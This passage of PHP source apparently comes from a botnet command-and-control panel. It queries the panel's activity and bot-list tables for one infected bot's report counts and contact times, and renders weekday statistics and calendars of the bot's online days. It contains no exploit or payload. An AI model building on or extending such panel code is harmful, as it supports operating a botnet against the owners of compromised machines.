            '<table class="month"><caption>', date('M', mktime(0,0,1,$m->m, 1, $m->y)), '</caption>',
            '<TBODY><THEAD><tr><th>Mon</th><th>Tue</th><th>Wed</th><th>Thu</th><th>Fri</th><th>Sat</th><th>Sun</th></tr></THEAD>';

            # Month: Empty days at the beginning

            echo '<tr>';
            for ($dow=1; $dow < $m->dow; $dow++)
                echo '<td> </td>';

            # Month: days
            for($d=1; $d <= $m->days; $d++){
                # End the week
                if ($dow++ % 7 == 1)
                    echo '</tr><tr>';
                # Print the day
                if ($r && $r->m == $m->m && $r->d == $d){
                    echo '<td class="online" title="', $r->t1, ' – ', $r->t2, ', ', $r->hits, ' reports">';

                    # The "online" div
                    if ($r->h2 < $r->h1 || $r->h2 == 0)
                        $r->h2 = 24;
                    $height = 60;
                    $margin = round(($r->h1/24)*$height);
                    $height = round((($r->h2 - $r->h1)/24)*$height);
                    echo '<div class="online" style="margin-top: ',$margin,'px; height: ',$height,'px;"></div>';

                    # The "hits" div
                    $size = round(20*$r->hits/$calendarstat_max);
                    echo '<div class="reports" style="height: ',$size,'%; width: ', $size, '%;"></div>';

                    # The date
                    echo $d;
                    echo '</td>';
                    $r = next($calendarstat);
                } else {
                    echo '<td>', $d, '</td>';
                }
            }

            # Month: End
            echo '</tr></TBODY></table></li>';
        }
        echo '</ul>';
        echo '</div>';

        ThemeEnd();
    }

    /** botnet_activity plot
     * @param $botId
     */
    function actionActivity($botId){
        ThemeBegin(LNG_MM_REPORTS_NEUROSTAT, 0, getBotJsMenu('botmenu'), 0);

        # Bot info, brief
        list($max_reports, $rtime_first, $rtime_last) = $this->db->query(
            'SELECT
                MAX(`ba`.`c_reports`) AS `reports_count`,
                `bl`.`rtime_first`,
                `bl`.`rtime_last`
             FROM `botnet_activity` `ba`
                LEFT JOIN `botnet_list` `bl` ON(`ba`.`botId` = `bl`.`bot_id`)
             WHERE `ba`.`botId`=:botId
            ;', array(
            ':botId' => $botId
        ))->fetch(PDO::FETCH_NUM);

        echo '<h2>', botPopupMenu($botId, 'botmenu'), '</h2>';
        echo '<table class="zabra lined" style="width: 500px;"><caption>Bot info</caption>',
            '<tr><th>Reports</th><td>', $max_reports, '</td></tr>',
            '<tr><th>First</th><td>', date('d.m.Y', $rtime_first), '</td></tr>',
            '<tr><th>Last</th><td>', date('d.m.Y', $rtime_last), '</td></tr>',
            '</table><br />';

        # botnet_activity: DOW stat
        $dowstat = array(); # { dow: [avg_time_from, avg_time_to] }, 0=Monday
        $dowstatdays = 0;

        $q = $this->db->query(
            'SELECT
                /*DATE_FORMAT(`date`, "%d.%m") AS `date`,*/
                WEEKDAY(`date`) AS `dow`,
                COUNT(*) AS `days`,
                SEC_TO_TIME(AVG(TIME_TO_SEC(TIME(FROM_UNIXTIME(`rtime_first`))))) AS `a`,
                SEC_TO_TIME(AVG(TIME_TO_SEC(TIME(FROM_UNIXTIME(`rtime_last`))))) AS `b`
             FROM `botnet_activity`
             WHERE `botId`=:botId
             GROUP BY `dow` ASC
             ;', array(
            ':botId' => $botId
        ));
        while ($r = $q->fetchObject()){
            if ($r->b < $r->a)
                $r->b = '23:59:59';
            $dowstat[$r->dow] = array($r->a, $r->b);
            $dowstatdays += $r->days;
        }

        # Export data to JSON
        echo jsonset(array(
            'window.data' => new stdClass(),
            'window.data.dowstat' => $dowstat,
        ));
        echo <<<HTML
        <h2>Activity Stat ($dowstatdays days)</h2>

        <div id="dowstat"></div>
HTML;

        # botnet_activity: days online (calendars)
        $months = $this->db->query(
            'SELECT DISTINCT
                YEAR(`date`) `y`,
                MONTH(`date`) `m`
             FROM `botnet_activity`
             WHERE `botId`=:botId
             ORDER BY `date` ASC
            ;', array(
            ':botId' => $botId
        ))->fetchAll(dbPDO::FETCH_OBJ);

        $q = $this->db->query(
            'SELECT
                MONTH(`date`) AS `m`,
                DAY(`date`) AS `d`,
                TIME(FROM_UNIXTIME(`rtime_first`)) AS `t1`,
                TIME(FROM_UNIXTIME(`rtime_last`)) AS `t2`,
                HOUR(FROM_UNIXTIME(`rtime_first`)) AS `h1`,
                HOUR(FROM_UNIXTIME(`rtime_last`)) AS `h2`,
                `c_reports`
             FROM `botnet_activity`
             WHERE `botId`=:botId
             ORDER BY `date` ASC
            ;', array(
            ':botId' => $botId,
        ));

        echo '<h2>Online days</h2>';
        echo '<ul id="calendars">';

        $r = $q->fetchObject();
        foreach ($months as $m){
            $m->time = mktime(0,0,0, $m->m, 1, $m->y);
            $m->dow = date('N', $m->time);
            $m->days = date('t', $m->time);

            # Month: Heading
            echo '<li>',
            '<table class="month"><caption>', date('M', mktime(0,0,1,$m->m, 1, $m->y)), '</caption>',
            '<TBODY><THEAD><tr><th>Mon</th><th>Tue</th><th>Wed</th><th>Thu</th><th>Fri</th><th>Sat</th><th>Sun</th></tr></THEAD>';

            # Month: Empty days at the beginning

            echo '<tr>';
            for ($dow=1; $dow < $m->dow; $dow++)
                echo '<td> </td>';

            # Month: days
            for($d=1; $d <= $m->days; $d++){
                # End the week
                if ($dow++ % 7 == 1)
                    echo '</tr><tr>';
                # Print the day
                if ($r && $r->m == $m->m && $r->d == $d){
                    echo '<td class="online" title="', $r->t1, ' – ', $r->t2, ', ', $r->c_reports, ' reports">';

                    # The "online" div
                    if ($r->h2 < $r->h1 || $r->h2 == 0)
                        $r->h2 = 24;
                    $height = 60;
                    $margin = round(($r->h1/24)*$height);
                    $height = round((($r->h2 - $r->h1)/24)*$height);
                    echo '<div class="online" style="margin-top: ',$margin,'px; height: ',$height,'px;"></div>';

                    # The "reports" div
                    $size = round(20*$r->c_reports/$max_reports);
                    echo '<div class="reports" style="height: ',$size,'%; width: ', $size, '%;"></div>';

                    # The date
                    echo $d;
                    echo '</td>';
                    $r = $q->fetchObject();
                } else {
                    echo '<td>', $d, '</td>';
                }
            }

            # Month: End
            echo '</tr></TBODY></table></li>';
        }
        echo '</ul>';

        # Scripts
        echo <<<HTML
        <script src="theme/js/highcharts/js/highcharts.js"></script>
        <script src="theme/js/highcharts/js/highcharts-more.js"></script>
        <script src="theme/js/page-reports_neurostat.js"></script>
HTML;

        ThemeEnd();
    }
    #endregion
}
